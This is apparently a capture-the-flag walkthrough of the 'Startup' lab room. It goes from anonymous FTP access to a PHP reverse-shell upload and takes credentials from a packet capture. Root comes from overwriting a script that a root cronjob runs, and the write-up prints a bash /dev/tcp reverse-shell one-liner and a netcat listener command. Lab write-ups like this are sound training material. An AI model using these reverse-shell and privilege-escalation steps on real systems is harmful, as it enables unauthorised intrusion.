# Startup

##### Written: 17/09/2021

##### IP Address: 10.10.96.254

---

### [ What is the secret spicy soup recipe? ]

First, let's run a basic **nmap** scan on our target machine using the follow command:

```
sudo nmap -sC -sV -vv 10.10.96.254
```

Results:

<img style="float: left;" src="screenshots/screenshot1.png">

As we can see, there are 3 ports currently open on the machine:

* 21 - FTP Server
* 22 - SSH Server
* 80 - HTTP Server

We can also see that the FTP server allows for **anonymous login**! This is a misconfiguration that can be commonly found on FTP servers, allowing us to access the files within the server without a password.

Let's login to the FTP server. We use the username: **anonymous** and do not need to supply a password.

<img style="float: left;" src="screenshots/screenshot2.png">

We find two files: **important.jpg** and **notice.txt**. There is also a **ftp** directory, although there seems to be nothing inside. Now let's download those files to our local machine using the command:

```
get < file_name >
```

<br>

Contents of **notice.txt**:

<img style="float: left;" src="screenshots/screenshot3.png">

Looks like some fluff about Among Us memes :sweat_smile:. There is also mention of **Maya**. We can note this down as it could be a potential username that we can use later on.

<br>

Next, we can open **important.jpg**, but it will give us the following error:

<img style="float: left;" src="screenshots/screenshot4.png">

Let's check the file format to find out what type of file this really is. We can do so by checking the **file signature**, which are also known as **magic numbers** or **magic bytes**. To do so, we use **hexeditor** like so:

```
hexeditor < file_name >
```

<img style="float: left;" src="screenshots/screenshot5.png">

Here, we can see the first few lines of hexadecimal characters that make up the file. The magic bytes will always be placed at the very beginning of the file. Looking at the following wikipedia page: 

https://en.wikipedia.org/wiki/List_of_file_signatures#:~:text=This%20is%20a%20list%20of,its%20contents%20will%20be%20unintelligible

<img style="float: left;" src="screenshots/screenshot6.png">

We can see that the file is actually a **PNG** file (*89 50 4E 47 0D 0A 1A 0A*). Now we just have to change the file extension of important.jpg to **important.png** and we should be able to view it.

Contents of **important.png**:

<img style="float: left;" src="screenshots/screenshot7.png">

Found the Among Us meme! While the content does not seem especially interesting, perhaps we can check for steganography by using **zsteg**:

```
zsteg < file_name >
```

Results:
<img style="float: left;" src="screenshots/screenshot8.png">





I'm not well-versed with steganography, but I believe that there is nothing that we can use from these results. Hitting a dead end here, let's go ahead and explore the other services that are currently running on our target.

<br>

When we visit the web server, we are greeted with the following page:

<img style="float: left;" src="screenshots/screenshot9.png">

There is a **'contact us'** link that opens the **mailto** functionality:

<img style="float: left;" src="screenshots/screenshot10.png">

From this Wikipedia page: https://en.wikipedia.org/wiki/Mailto, I learnt that **mailto** is a Uniform Resource Identifier (URI) scheme for email addresses. It is used to produce hyperlinks on websites that allow users to send an email to a specific address directly from an HTML document, without having to copy it and entering it into an email client. 

It would also seem that the **mailto** has not been properly configured as it points to **#**, instead of an email address. Looking at the source code of the page, we can confirm this as the developer has left a comment:

<img style="float: left;" src="screenshots/screenshot11.png">

At first, I thought that we would be exploiting a vulnerability with this **mailto** functionality. However, after doing some research online, I was unable to find a vulnerability that could be used for this room. (There were a variety of vulnerabilities that do exist though!)

<br>

Next, we can run a **Gobuster** scan to try and find any hidden directories on this web server:

```
gobuster dir -u http://10.10.96.254/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Results of scan:

<img style="float: left;" src="screenshots/screenshot12.png">

There is a **/files** directory on the web server! Visiting this directory, we are brought to the FTP directory from earlier.

<img style="float: left;" src="screenshots/screenshot13.png">

Great! This means that we can upload a **reverse shell** script onto the FTP server and then execute it from this web directory, granting us access into the machine. 

We will be using the **PHP** **reverse shell** script created by **pentestmonkey**. To upload the script onto the FTP server, we use the following command:

```
put <file_name>
```

<img style="float: left;" src="screenshots/screenshot14.png">

After doing so, we can see that the script has been successfully uploaded on the **ftp** directory within the FTP server. Now, we just have to run a **netcat listener** and open the script within the web browser.

**netcat** command:

```
nc -lvnp 1234
```

<br>

Gaining access :smiling_imp: :

<img style="float: left;" src="screenshots/screenshot15.png">

<br>

<img style="float: left;" src="screenshots/screenshot16.png">

In the **/** directory, we can find the **recipe.txt** file, which gives us flag to the first question:

<img style="float: left;" src="screenshots/screenshot17.png">

The secret soup recipe is **love**.

---

### [ What are the contents of user.txt? ]

Within the **/** directory, we can also see an interesting directory called **incidents**. The directory contains a **pcap** file called **suspicious.pcapng**:

<img style="float: left;" src="screenshots/screenshot18.png">

Let's go ahead and download this file onto our local machine and open it up in **Wireshark**!

<br>

<img style="float: left;" src="screenshots/screenshot19.png">

We will need to sieve through the captured packets to see if we can obtain any usable information such as passwords. Firstly, let's check out the **HTTP** traffic captured, as that is unencrypted and could reveal some credentials:

<img style="float: left;" src="screenshots/screenshot20.png">

There are only a few HTTP packets and none of them contain any credentials. With that said, it seems as if someone prior had already conducted the same attack as us, having uploaded their own reverse shell onto the FTP server.

<br>

Next, let's look at **TCP** traffic. We can simple **right-click** on any of the TCP packets and click on **Follow** > **TCP Stream**. 

<img style="float: left;" src="screenshots/screenshot21.png">

Nice! We've found a potential username and password -> **lennie:c4ntg3t3n0ughsp1c3**

With this credentials, we can try to log into the **SSH** server:

<img style="float: left;" src="screenshots/screenshot22.png">

And we're in! We can then obtain **user.txt**.

---

### [ What are the contents of root.txt? ]

Within Lennie's home directory, there are two interesting directories: **Documents** and **scripts**.

Looking at **Documents**, there are 3 text files: **concern.txt**, **list.txt** and **note.txt**. These files did not seem to contain anything that we can use to escalate our privileges.

Next, in the **scripts** directory, there is a **planner.sh** script and **startup_list.txt** file. What's interesting to note is that both of these files are owned by **root**.

<img style="float: left;" src="screenshots/screenshot23.png">

Since we can read **planner.sh** as a non-root user, we can find out what it does:

<img style="float: left;" src="screenshots/screenshot24.png">

It looks like it echoes the contents of **$LIST** into **startup_list.txt**, before running **/etc/print.sh**. Let's now take a look at **/etc/print.sh**.

<img style="float: left;" src="screenshots/screenshot25.png">

All it does is **echo "Done!"**. With that said, **print.sh** actually belongs to **Lennie**! This means that we are able to write over it and since it's a bash script, we can have it execute anything we want, such as opening a **reverse shell**. We'll be using the **bash** reverse shell from: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

```
bash -i >& /dev/tcp/<IP_ADDRESS_HERE>/<PORT_HERE> 0>&1
```

Now, we just have to figure out how we can execute **planner.sh** as **root**, which will then subsequently execute **print.sh** and open  up the reverse shell with root privileges.

<br>

At this point, I had an inkling that **planner.sh** was most probably being run as a **cronjob** by root. To verify this, we can use a nifty program called **pspy** (https://github.com/DominicBreuker/pspy/blob/master/README.md), which allows us to snoop on processes without the need for root permissions. This tool will tell us what cronjobs root is running without needing root permissions. 

After uploading the **pspy32** executable onto the SSH server, we can then execute it:

<img style="float: left;" src="screenshots/screenshot26.png">

As we can see, the **planner.sh** was automatically run with the UID=0 (root). This confirms that it is indeed a cronjob belonging to root!

Now, all we have to do is set up our netcat listener, sit back and relax.

<br>

<img style="float: left;" src="screenshots/screenshot27.png">

**After a few seconds, our reverse shell is successfully opened and we are logged into the server as root. With that, we can obtain root.txt and complete the room.**

